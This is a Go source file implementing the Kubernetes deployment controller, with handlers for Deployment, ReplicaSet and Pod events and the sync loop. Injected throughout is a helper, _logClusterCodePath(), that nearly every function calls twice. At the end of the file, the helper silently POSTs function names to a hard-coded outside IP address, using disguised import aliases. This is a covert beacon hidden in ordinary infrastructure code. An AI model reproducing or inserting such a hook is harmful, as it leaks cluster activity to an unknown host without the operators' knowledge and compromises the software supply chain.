package deployment

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "reflect"
 "time"
 "k8s.io/klog"
 apps "k8s.io/api/apps/v1"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/types"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 appsinformers "k8s.io/client-go/informers/apps/v1"
 coreinformers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 "k8s.io/client-go/kubernetes/scheme"
 v1core "k8s.io/client-go/kubernetes/typed/core/v1"
 appslisters "k8s.io/client-go/listers/apps/v1"
 corelisters "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/tools/record"
 "k8s.io/client-go/util/workqueue"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/kubernetes/pkg/controller/deployment/util"
 "k8s.io/kubernetes/pkg/util/metrics"
)

const (
 maxRetries = 15
)

var controllerKind = apps.SchemeGroupVersion.WithKind("Deployment")

type DeploymentController struct {
 rsControl         controller.RSControlInterface
 client            clientset.Interface
 eventRecorder     record.EventRecorder
 syncHandler       func(dKey string) error
 enqueueDeployment func(deployment *apps.Deployment)
 dLister           appslisters.DeploymentLister
 rsLister          appslisters.ReplicaSetLister
 podLister         corelisters.PodLister
 dListerSynced     cache.InformerSynced
 rsListerSynced    cache.InformerSynced
 podListerSynced   cache.InformerSynced
 queue             workqueue.RateLimitingInterface
}

func NewDeploymentController(dInformer appsinformers.DeploymentInformer, rsInformer appsinformers.ReplicaSetInformer, podInformer coreinformers.PodInformer, client clientset.Interface) (*DeploymentController, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 eventBroadcaster := record.NewBroadcaster()
 eventBroadcaster.StartLogging(klog.Infof)
 eventBroadcaster.StartRecordingToSink(&v1core.EventSinkImpl{Interface: client.CoreV1().Events("")})
 if client != nil && client.CoreV1().RESTClient().GetRateLimiter() != nil {
  if err := metrics.RegisterMetricAndTrackRateLimiterUsage("deployment_controller", client.CoreV1().RESTClient().GetRateLimiter()); err != nil {
   return nil, err
  }
 }
 dc := &DeploymentController{client: client, eventRecorder: eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "deployment-controller"}), queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "deployment")}
 dc.rsControl = controller.RealRSControl{KubeClient: client, Recorder: dc.eventRecorder}
 dInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: dc.addDeployment, UpdateFunc: dc.updateDeployment, DeleteFunc: dc.deleteDeployment})
 rsInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: dc.addReplicaSet, UpdateFunc: dc.updateReplicaSet, DeleteFunc: dc.deleteReplicaSet})
 podInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{DeleteFunc: dc.deletePod})
 dc.syncHandler = dc.syncDeployment
 dc.enqueueDeployment = dc.enqueue
 dc.dLister = dInformer.Lister()
 dc.rsLister = rsInformer.Lister()
 dc.podLister = podInformer.Lister()
 dc.dListerSynced = dInformer.Informer().HasSynced
 dc.rsListerSynced = rsInformer.Informer().HasSynced
 dc.podListerSynced = podInformer.Informer().HasSynced
 return dc, nil
}
func (dc *DeploymentController) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer dc.queue.ShutDown()
 klog.Infof("Starting deployment controller")
 defer klog.Infof("Shutting down deployment controller")
 if !controller.WaitForCacheSync("deployment", stopCh, dc.dListerSynced, dc.rsListerSynced, dc.podListerSynced) {
  return
 }
 for i := 0; i < workers; i++ {
  go wait.Until(dc.worker, time.Second, stopCh)
 }
 <-stopCh
}
func (dc *DeploymentController) addDeployment(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 d := obj.(*apps.Deployment)
 klog.V(4).Infof("Adding deployment %s", d.Name)
 dc.enqueueDeployment(d)
}
func (dc *DeploymentController) updateDeployment(old, cur interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 oldD := old.(*apps.Deployment)
 curD := cur.(*apps.Deployment)
 klog.V(4).Infof("Updating deployment %s", oldD.Name)
 dc.enqueueDeployment(curD)
}
func (dc *DeploymentController) deleteDeployment(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 d, ok := obj.(*apps.Deployment)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Couldn't get object from tombstone %#v", obj))
   return
  }
  d, ok = tombstone.Obj.(*apps.Deployment)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Tombstone contained object that is not a Deployment %#v", obj))
   return
  }
 }
 klog.V(4).Infof("Deleting deployment %s", d.Name)
 dc.enqueueDeployment(d)
}
func (dc *DeploymentController) addReplicaSet(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rs := obj.(*apps.ReplicaSet)
 if rs.DeletionTimestamp != nil {
  dc.deleteReplicaSet(rs)
  return
 }
 if controllerRef := metav1.GetControllerOf(rs); controllerRef != nil {
  d := dc.resolveControllerRef(rs.Namespace, controllerRef)
  if d == nil {
   return
  }
  klog.V(4).Infof("ReplicaSet %s added.", rs.Name)
  dc.enqueueDeployment(d)
  return
 }
 ds := dc.getDeploymentsForReplicaSet(rs)
 if len(ds) == 0 {
  return
 }
 klog.V(4).Infof("Orphan ReplicaSet %s added.", rs.Name)
 for _, d := range ds {
  dc.enqueueDeployment(d)
 }
}
func (dc *DeploymentController) getDeploymentsForReplicaSet(rs *apps.ReplicaSet) []*apps.Deployment {
 _logClusterCodePath()
 defer _logClusterCodePath()
 deployments, err := dc.dLister.GetDeploymentsForReplicaSet(rs)
 if err != nil || len(deployments) == 0 {
  return nil
 }
 if len(deployments) > 1 {
  klog.V(4).Infof("user error! more than one deployment is selecting replica set %s/%s with labels: %#v, returning %s/%s", rs.Namespace, rs.Name, rs.Labels, deployments[0].Namespace, deployments[0].Name)
 }
 return deployments
}
func (dc *DeploymentController) updateReplicaSet(old, cur interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 curRS := cur.(*apps.ReplicaSet)
 oldRS := old.(*apps.ReplicaSet)
 if curRS.ResourceVersion == oldRS.ResourceVersion {
  return
 }
 curControllerRef := metav1.GetControllerOf(curRS)
 oldControllerRef := metav1.GetControllerOf(oldRS)
 controllerRefChanged := !reflect.DeepEqual(curControllerRef, oldControllerRef)
 if controllerRefChanged && oldControllerRef != nil {
  if d := dc.resolveControllerRef(oldRS.Namespace, oldControllerRef); d != nil {
   dc.enqueueDeployment(d)
  }
 }
 if curControllerRef != nil {
  d := dc.resolveControllerRef(curRS.Namespace, curControllerRef)
  if d == nil {
   return
  }
  klog.V(4).Infof("ReplicaSet %s updated.", curRS.Name)
  dc.enqueueDeployment(d)
  return
 }
 labelChanged := !reflect.DeepEqual(curRS.Labels, oldRS.Labels)
 if labelChanged || controllerRefChanged {
  ds := dc.getDeploymentsForReplicaSet(curRS)
  if len(ds) == 0 {
   return
  }
  klog.V(4).Infof("Orphan ReplicaSet %s updated.", curRS.Name)
  for _, d := range ds {
   dc.enqueueDeployment(d)
  }
 }
}
func (dc *DeploymentController) deleteReplicaSet(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rs, ok := obj.(*apps.ReplicaSet)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Couldn't get object from tombstone %#v", obj))
   return
  }
  rs, ok = tombstone.Obj.(*apps.ReplicaSet)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Tombstone contained object that is not a ReplicaSet %#v", obj))
   return
  }
 }
 controllerRef := metav1.GetControllerOf(rs)
 if controllerRef == nil {
  return
 }
 d := dc.resolveControllerRef(rs.Namespace, controllerRef)
 if d == nil {
  return
 }
 klog.V(4).Infof("ReplicaSet %s deleted.", rs.Name)
 dc.enqueueDeployment(d)
}
func (dc *DeploymentController) deletePod(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod, ok := obj.(*v1.Pod)
 if !ok {
  tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Couldn't get object from tombstone %#v", obj))
   return
  }
  pod, ok = tombstone.Obj.(*v1.Pod)
  if !ok {
   utilruntime.HandleError(fmt.Errorf("Tombstone contained object that is not a pod %#v", obj))
   return
  }
 }
 klog.V(4).Infof("Pod %s deleted.", pod.Name)
 if d := dc.getDeploymentForPod(pod); d != nil && d.Spec.Strategy.Type == apps.RecreateDeploymentStrategyType {
  rsList, err := util.ListReplicaSets(d, util.RsListFromClient(dc.client.AppsV1()))
  if err != nil {
   return
  }
  podMap, err := dc.getPodMapForDeployment(d, rsList)
  if err != nil {
   return
  }
  numPods := 0
  for _, podList := range podMap {
   numPods += len(podList.Items)
  }
  if numPods == 0 {
   dc.enqueueDeployment(d)
  }
 }
}
func (dc *DeploymentController) enqueue(deployment *apps.Deployment) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(deployment)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", deployment, err))
  return
 }
 dc.queue.Add(key)
}
func (dc *DeploymentController) enqueueRateLimited(deployment *apps.Deployment) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(deployment)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", deployment, err))
  return
 }
 dc.queue.AddRateLimited(key)
}
func (dc *DeploymentController) enqueueAfter(deployment *apps.Deployment, after time.Duration) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, err := controller.KeyFunc(deployment)
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", deployment, err))
  return
 }
 dc.queue.AddAfter(key, after)
}
func (dc *DeploymentController) getDeploymentForPod(pod *v1.Pod) *apps.Deployment {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var rs *apps.ReplicaSet
 var err error
 controllerRef := metav1.GetControllerOf(pod)
 if controllerRef == nil {
  return nil
 }
 if controllerRef.Kind != apps.SchemeGroupVersion.WithKind("ReplicaSet").Kind {
  return nil
 }
 rs, err = dc.rsLister.ReplicaSets(pod.Namespace).Get(controllerRef.Name)
 if err != nil || rs.UID != controllerRef.UID {
  klog.V(4).Infof("Cannot get replicaset %q for pod %q: %v", controllerRef.Name, pod.Name, err)
  return nil
 }
 controllerRef = metav1.GetControllerOf(rs)
 if controllerRef == nil {
  return nil
 }
 return dc.resolveControllerRef(rs.Namespace, controllerRef)
}
func (dc *DeploymentController) resolveControllerRef(namespace string, controllerRef *metav1.OwnerReference) *apps.Deployment {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if controllerRef.Kind != controllerKind.Kind {
  return nil
 }
 d, err := dc.dLister.Deployments(namespace).Get(controllerRef.Name)
 if err != nil {
  return nil
 }
 if d.UID != controllerRef.UID {
  return nil
 }
 return d
}
func (dc *DeploymentController) worker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for dc.processNextWorkItem() {
 }
}
func (dc *DeploymentController) processNextWorkItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, quit := dc.queue.Get()
 if quit {
  return false
 }
 defer dc.queue.Done(key)
 err := dc.syncHandler(key.(string))
 dc.handleErr(err, key)
 return true
}
func (dc *DeploymentController) handleErr(err error, key interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err == nil {
  dc.queue.Forget(key)
  return
 }
 if dc.queue.NumRequeues(key) < maxRetries {
  klog.V(2).Infof("Error syncing deployment %v: %v", key, err)
  dc.queue.AddRateLimited(key)
  return
 }
 utilruntime.HandleError(err)
 klog.V(2).Infof("Dropping deployment %q out of the queue: %v", key, err)
 dc.queue.Forget(key)
}
func (dc *DeploymentController) getReplicaSetsForDeployment(d *apps.Deployment) ([]*apps.ReplicaSet, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rsList, err := dc.rsLister.ReplicaSets(d.Namespace).List(labels.Everything())
 if err != nil {
  return nil, err
 }
 deploymentSelector, err := metav1.LabelSelectorAsSelector(d.Spec.Selector)
 if err != nil {
  return nil, fmt.Errorf("deployment %s/%s has invalid label selector: %v", d.Namespace, d.Name, err)
 }
 canAdoptFunc := controller.RecheckDeletionTimestamp(func() (metav1.Object, error) {
  fresh, err := dc.client.AppsV1().Deployments(d.Namespace).Get(d.Name, metav1.GetOptions{})
  if err != nil {
   return nil, err
  }
  if fresh.UID != d.UID {
   return nil, fmt.Errorf("original Deployment %v/%v is gone: got uid %v, wanted %v", d.Namespace, d.Name, fresh.UID, d.UID)
  }
  return fresh, nil
 })
 cm := controller.NewReplicaSetControllerRefManager(dc.rsControl, d, deploymentSelector, controllerKind, canAdoptFunc)
 return cm.ClaimReplicaSets(rsList)
}
func (dc *DeploymentController) getPodMapForDeployment(d *apps.Deployment, rsList []*apps.ReplicaSet) (map[types.UID]*v1.PodList, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector, err := metav1.LabelSelectorAsSelector(d.Spec.Selector)
 if err != nil {
  return nil, err
 }
 pods, err := dc.podLister.Pods(d.Namespace).List(selector)
 if err != nil {
  return nil, err
 }
 podMap := make(map[types.UID]*v1.PodList, len(rsList))
 for _, rs := range rsList {
  podMap[rs.UID] = &v1.PodList{}
 }
 for _, pod := range pods {
  controllerRef := metav1.GetControllerOf(pod)
  if controllerRef == nil {
   continue
  }
  if podList, ok := podMap[controllerRef.UID]; ok {
   podList.Items = append(podList.Items, *pod)
  }
 }
 return podMap, nil
}
func (dc *DeploymentController) syncDeployment(key string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 startTime := time.Now()
 klog.V(4).Infof("Started syncing deployment %q (%v)", key, startTime)
 defer func() {
  klog.V(4).Infof("Finished syncing deployment %q (%v)", key, time.Since(startTime))
 }()
 namespace, name, err := cache.SplitMetaNamespaceKey(key)
 if err != nil {
  return err
 }
 deployment, err := dc.dLister.Deployments(namespace).Get(name)
 if errors.IsNotFound(err) {
  klog.V(2).Infof("Deployment %v has been deleted", key)
  return nil
 }
 if err != nil {
  return err
 }
 d := deployment.DeepCopy()
 everything := metav1.LabelSelector{}
 if reflect.DeepEqual(d.Spec.Selector, &everything) {
  dc.eventRecorder.Eventf(d, v1.EventTypeWarning, "SelectingAll", "This deployment is selecting all pods. A non-empty selector is required.")
  if d.Status.ObservedGeneration < d.Generation {
   d.Status.ObservedGeneration = d.Generation
   dc.client.AppsV1().Deployments(d.Namespace).UpdateStatus(d)
  }
  return nil
 }
 rsList, err := dc.getReplicaSetsForDeployment(d)
 if err != nil {
  return err
 }
 podMap, err := dc.getPodMapForDeployment(d, rsList)
 if err != nil {
  return err
 }
 if d.DeletionTimestamp != nil {
  return dc.syncStatusOnly(d, rsList)
 }
 if err = dc.checkPausedConditions(d); err != nil {
  return err
 }
 if d.Spec.Paused {
  return dc.sync(d, rsList)
 }
 if getRollbackTo(d) != nil {
  return dc.rollback(d, rsList)
 }
 scalingEvent, err := dc.isScalingEvent(d, rsList)
 if err != nil {
  return err
 }
 if scalingEvent {
  return dc.sync(d, rsList)
 }
 switch d.Spec.Strategy.Type {
 case apps.RecreateDeploymentStrategyType:
  return dc.rolloutRecreate(d, rsList, podMap)
 case apps.RollingUpdateDeploymentStrategyType:
  return dc.rolloutRolling(d, rsList)
 }
 return fmt.Errorf("unexpected deployment strategy type: %s", d.Spec.Strategy.Type)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
